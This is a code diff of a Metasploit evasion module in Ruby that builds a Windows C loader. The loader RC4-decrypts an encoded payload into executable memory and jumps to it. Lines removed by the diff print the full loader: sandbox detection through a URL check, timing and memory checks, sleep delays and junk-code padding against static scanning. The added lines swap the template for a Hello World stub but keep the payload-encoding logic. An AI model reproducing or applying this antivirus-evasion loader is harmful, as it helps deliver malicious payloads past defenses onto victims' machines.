@@ -32,7 +32,7 @@ class MetasploitModule < Msf::Evasion
 
   def get_payload
     @c_payload ||= lambda {
-      opts = { format: 'rc4', key: rc4_key}
+      opts = { format: 'rc4', key: rc4_key }
       junk = Rex::Text.rand_text(10..1024)
       p = payload.encoded + junk
 
@@ -43,18 +43,14 @@ class MetasploitModule < Msf::Evasion
       }
     }.call
   end
-
 def get_payload_bytes()
   payload = get_payload[:hex_format]
   s = ""
   i = 0
   j = 0
-  vector = rand(1..999999)
+  vector = rand(1..1024)
   while j < get_payload[:size]
-    s += "  buf[#{j}] = ((char)\'\\x#{((payload[i]+payload[i+1]).hex + vector).to_s(16).rjust(2, "0")}\'-#{vector});\n" 
-    if rand(1..100) > 98
-      s += junk_code(1)
-    end
+    s += "  buf[#{j}] = \'\\x#{((payload[i]+payload[i+1]).hex + vector).to_s(16).rjust(2, "0")}\'-#{vector};\n"
     i = i+2
     j = j+1
   end
@@ -76,7 +72,7 @@ def fill_array(size)
 end
 
 def junk_code(flag) #if flag is 0 return a function , if flag is 1 return a call to a function
-  #fibonnacci fucntion
+  #fibonnacci fucntion in junk 0
   fibonnacci = %Q|
   int fib(int n) {
     if (n <= 1)
@@ -120,14 +116,13 @@ def junk_code(flag) #if flag is 0 return a function , if flag is 1 return a call
   |
   #fibonnacci call example
   fibonnacci_call = %Q|
-  fib(#{rand(1..15)});
+  fib(#{rand(1..100)});
   |
   #bubbel sort call example
   arr_size = rand(1..100)
-  arr_name = Rex::Text.rand_text_alpha(5)
   bubbel_sort_call = %Q|
-  int #{arr_name}[#{arr_size}] = {#{fill_array(arr_size)}};
-  bubbel_sort(#{arr_name}, #{arr_size});
+  int arr[#{arr_size}] = {#{fill_array(arr_size)}};
+  bubbel_sort(arr, #{arr_size});
   |
   #euclide call example
   euclide_call = %Q|
@@ -135,10 +130,9 @@ def junk_code(flag) #if flag is 0 return a function , if flag is 1 return a call
   |
   #binary search call example
   arr_size = rand(1..100)
-  arr_name = Rex::Text.rand_text_alpha(5)
   binary_search_call = %Q|
-  int #{arr_name}[#{arr_size}] = {#{fill_array(arr_size)}};
-  binary_search(#{arr_name}, 0, #{arr_size-1}, #{rand(1..100)});
+  int arr[#{arr_size}] = {#{fill_array(arr_size)}};
+  binary_search(arr, 0, #{arr_size-1}, #{rand(1..100)});
   |
   if flag == 0
     return [fibonnacci, bubbel_sort, euclide, binary_search].shuffle
@@ -147,36 +141,29 @@ def junk_code(flag) #if flag is 0 return a function , if flag is 1 return a call
   end
 end
 
-
-
 def get_includes()
-  rc4 = "#include \"#{File.join(Msf::Config.install_root, 'data', 'headers', 'windows')}/rc4.h\""
-  includes = ["#include <windows.h>\n", "#include <psapi.h>\n", "#include <wininet.h>\n", "#include <synchapi.h>\n", "#include <stdio.h>\n", rc4]
+  includes = ["#include <windows.h>\n", "#include <psapi.h>\n", "#include <wininet.h>\n"]
   includes.shuffle
   return includes.join
 end
 
+
 def get_check_url()
   fct_url = "int check_url() {\n"
-  fct_url += "  #{junk_code(1)}\n"
   fct_url += "char url[] = \"https://www.#{Rex::Text.rand_text_alpha(rand(10..20))}.com\";\n"
   fct_url += "HINTERNET httpopen, openurl;\n"
-  fct_url += "  #{junk_code(1)}\n"
   fct_url += "DWORD read;\n"
   fct_url += "httpopen=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);\n"
-  fct_url += "  #{junk_code(1)}\n"
   fct_url += "openurl=InternetOpenUrl(httpopen,url,NULL,NULL,INTERNET_FLAG_RELOAD\|INTERNET_FLAG_NO_CACHE_WRITE,NULL);\n"
   fct_url += "if (!openurl) // Access failed, we are not in AV\n"
   fct_url += "{\n"
-  fct_url += "  #{junk_code(1)}\n"
+  fct_url += "  #{junk_code(1)};\n"
   fct_url += "  InternetCloseHandle(httpopen);\n"
   fct_url += "  InternetCloseHandle(openurl);\n"
   fct_url += "  return 0;\n"
   fct_url += "}\n"
   fct_url += "InternetCloseHandle(httpopen);\n"
-  fct_url += "  #{junk_code(1)}\n"
   fct_url += "InternetCloseHandle(openurl);\n"
-  fct_url += "  #{junk_code(1)}\n"
   fct_url += "return 1;\n"
   fct_url += "}\n"
   return fct_url
@@ -184,96 +171,23 @@ end
 
   def c_template
     @c_template ||= %Q|
-
-
-#{get_includes}
-#pragma comment(lib, "Psapi.lib")
-#pragma comment(lib, "Wininet.lib")
-
-// The encrypted code allows us to get around static scanning
-
-int size  = #{get_payload[:size]};
-char buf[#{get_payload[:size]}];
-
-#define max_op #{rand(100000000..500000000)}
-
-#{junk_code(0).join}
-
-#{get_check_url}
+#include <windows.h>
+#include <stdio.h>
 
 int main(int argc, char **argv)
 {
-int lpBufSize = sizeof(int) * size;
-  LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x00000040);
-  memset(lpBuf, '\\0', lpBufSize);
-  
-  
-  if (check_url())
-    exit(1);
-  #{junk_code(1)}
-  int cpt = 0;
-  int i = 0;
-  #{junk_code(1)}
-  for (i = 0; i < max_op; i++) {
-    cpt++;
-  }
-  printf("cpt = %d\\n", cpt);
-  if (cpt == max_op) {
-    ;
-  }
-   else {
-      exit(33);
-  }
-  PROCESS_MEMORY_COUNTERS pmc;
-  GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc));
-    #{junk_code(1)}
-  if(!(pmc.WorkingSetSize<=3500000))
-  {
-      #{junk_code(1)}
-  }
-
-    #{junk_code(1)}
-    #{get_payload_bytes}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  Sleep(10000);
-  RC4("#{rc4_key}", buf, (char*) lpBuf, size);
-    void (*func)();
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-    func = (void (*)()) lpBuf;
-    #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-    (void)(*func)();
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-  #{junk_code(1)}
-    return 0;
+  char str[] = "Hello World!";
+  printf("%s\\n", str);
+  return 0;
 }|
   end
 
   def run
     # The randomized code allows us to generate a unique EXE
-    fname = Rex::Text.rand_text_alpha(4..7)
-    path = File.join(Msf::Config.local_directory, fname)
-    full_path = ::File.expand_path(path)
-    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: full_path, compile_options: " -lpsapi -lwininet -w " })
-    output = m.compile_c(c_template)
-    print_status("Compiler output len : #{output.length}")
-    print_status("#{output}")
-    print_good "#{fname}.exe stored at #{full_path}.exe"
+    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: "OK", compile_options: " -lpsapi -lwininet " })
+    bin = m.compile_c(c_template)
+    print_status("Compiled executable size: #{bin.length}")
+    file_create(bin)
   end
 
 end
